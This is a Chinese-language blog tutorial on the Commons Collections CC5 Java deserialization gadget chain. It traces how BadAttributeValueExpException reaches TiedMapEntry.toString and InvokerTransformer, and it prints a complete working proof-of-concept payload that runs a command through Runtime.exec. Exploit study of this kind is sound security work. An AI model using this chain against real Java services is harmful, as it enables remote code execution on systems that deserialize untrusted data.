---
title: "Java反序列化-CC5"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# java反序列化-CC5

在学习CC6的时候，我们用到了`org.apache.commons.collections.keyvalue.TiedMapEntry`，它的hashcode()方法调用了getValue()，而getValue()调用到了get()

我们再看一下TiedMapEntry可以发现它的toString()方法中也调用了getValue()：

![QQ_1761890727242](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761890727242.png)

而CC5就是从这个地方入手进行调用，我们可以找到一个叫做BadAttributeValueExpExceptio的方法调用了toString()，虽然这个类没有实现Serializable接口，但是其父类Exception的父类Throwable实现了Serializable接口，所以BadAttributeValueException也是可以序列化的：

![QQ_1761890862076](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761890862076.png)

在它的readObject()方法中进行了调用：

![QQ_1761891407434](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761891407434.png)

我们需要进入这个if判断条件，因为默认情况下System.getSecurityManager()为null，那么不用管了，只需要控制valObj为TiedMapEntry对象即可

同时，注意到这里还有个构造方法：
![QQ_1761892401481](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761892401481.png)

里面是个三目运算符，可以看到这里将val设置为TiedMapEntry就会立即调用TiedMapEntry#toString，我们不想让他提前触发，所以我们在实例化时先将参数设置为null：

~~~java
BadAttributeValueExpException bavee = new BadAttributeValueExpException(null);
~~~

再反射修改将我们创建的TiedMapEntry传入：

~~~java
TiedMapEntry tme = new TiedMapEntry(outerMap, "Yuy0ung");
Field val = bavee.getClass().getDeclaredField("val");
val.setAccessible(true);
val.set(bavee,tme);
~~~

其他部分就是CC6的逻辑，完整代码如下：

~~~java
package com.yuy0ung;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]} ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        BadAttributeValueExpException bavee = new BadAttributeValueExpException(null);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "Yuy0ung");
        Field val = bavee.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(bavee,tme);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        serialize(bavee);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

运行成功命令执行：

![QQ_1761892719734](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761892719734.png)